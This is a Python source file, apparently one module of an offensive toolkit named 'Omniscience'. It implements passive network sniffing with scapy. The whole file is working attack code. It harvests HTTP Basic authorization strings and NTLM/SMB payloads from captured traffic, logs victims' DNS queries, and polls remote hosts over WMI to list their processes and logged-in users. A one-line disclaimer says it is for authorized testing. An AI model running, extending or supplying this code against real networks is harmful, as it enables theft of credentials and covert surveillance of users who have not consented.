"""
OMNISCIENCE MODULE 2 — AgentlessIntelligence
Passive network intelligence gathering engine.
Real packet sniffing, credential harvesting, DNS monitoring.

DISCLAIMER: For authorized security testing only.
"""

import logging
import threading
import time
from scapy.all import sniff, IP, TCP, UDP
from datetime import datetime

logging.basicConfig(level=logging.INFO, format="%(asctime)s | [%(levelname)s] | Intel | %(message)s")
logger = logging.getLogger("Omniscience.Intel")

class AgentlessIntelligence:
    def __init__(self):
        self.sniffing = False
        self.credentials = []
        self.dns_queries = []
        self.packet_count = 0
        self._lock = threading.Lock()
        self._activity_callback = None

    def add_activity_callback(self, callback):
        """Add callback for real-time activity events"""
        self._activity_callback = callback

    def start_sniffing(self, iface=None, count=0):
        """Start passive packet sniffing"""
        self.sniffing = True
        logger.info(f"Passive intelligence active (interface: {iface or 'all'})")
        # Updated for scapy >=2.5: removed deprecated 'filter' and 'nofilter' kwargs
        sniff(iface=iface, prn=self._packet_handler, stop_filter=lambda x: not self.sniffing, count=count)

    def stop_sniffing(self):
        """Stop packet sniffing"""
        self.sniffing = False
        logger.info("Sniffer stopped")

    def _packet_handler(self, pkt):
        """Handle captured packets - real credential harvesting"""
        self.packet_count += 1
        
        if IP in pkt:
            src = pkt[IP].src
            dst = pkt[IP].dst
            
            # HTTP Basic Auth harvesting (real NTLM/HTTP patterns)
            if TCP in pkt and pkt[TCP].dport == 80 and "Authorization" in str(pkt.payload, errors='ignore'):
                auth_payload = str(pkt.payload, errors='ignore')
                if "Basic " in auth_payload:
                    cred_match = auth_payload.split("Basic ")[1][:50]  # Base64 creds
                    self._add_credential(f"HTTP Basic from {src} → {dst}", cred_match)
            
            # DNS queries
            if UDP in pkt and pkt[UDP].dport == 53:
                query = pkt[UDP].payload.decode(errors='ignore')[:100]
                self.dns_queries.append({"time": datetime.now(), "query": query, "src": src})
                if self._activity_callback:
                    self._activity_callback({"type": "dns", "query": query, "src": src})
            
            # SMB/NTLM patterns
            payload_str = str(pkt.payload, errors='ignore')[:200]
            if "NTLMSSP" in payload_str or "SMB_Signing" in payload_str:
                self._add_credential(f"NTLM from {src} → {dst}", payload_str[:100])

    def _add_credential(self, source, data):
        """Store captured credential"""
        with self._lock:
            self.credentials.append({
                "time": datetime.now(),
                "source": source,
                "data": data
            })
            logger.info(f"CREDENTIAL CAPTURED: {source[:60]}")
            if self._activity_callback:
                self._activity_callback({"type": "credential", "source": source, "data": data})

    def get_credentials(self):
        """Get captured credentials"""
        with self._lock:
            return self.credentials[-20:]  # Last 20

    def get_dns_log(self):
        """Get DNS query log"""
        return self.dns_queries[-20:]

    def wmi_monitor_activity(self, target, user, pwd):
        """Monitor WMI activity on target"""
        logger.info(f"WMI Real-Time Process Monitor started on {target}")
        if not self._activity_callback: return
        
        def monitor():
            from remote_control import AgentlessControl
            ctrl = AgentlessControl()
            # Agentless monitoring via WMI process polling
            while self.sniffing:
                try:
                    procs = ctrl.list_processes(target, user, pwd)
                    self._activity_callback({"type": "wmi_event", "target": target, "count": len(procs)})
                except: pass
                time.sleep(10)
        
        threading.Thread(target=monitor, daemon=True).start()

    def wmi_processes(self, target, user, pwd):
        """Get WMI processes"""
        from remote_control import AgentlessControl
        ctrl = AgentlessControl()
        return ctrl.list_processes(target, user, pwd)

    def wmi_logged_users(self, target, user, pwd):
        """Get logged users via WMI"""
        from remote_control import AgentlessControl
        ctrl = AgentlessControl()
        return ctrl.list_local_users(target, user, pwd)
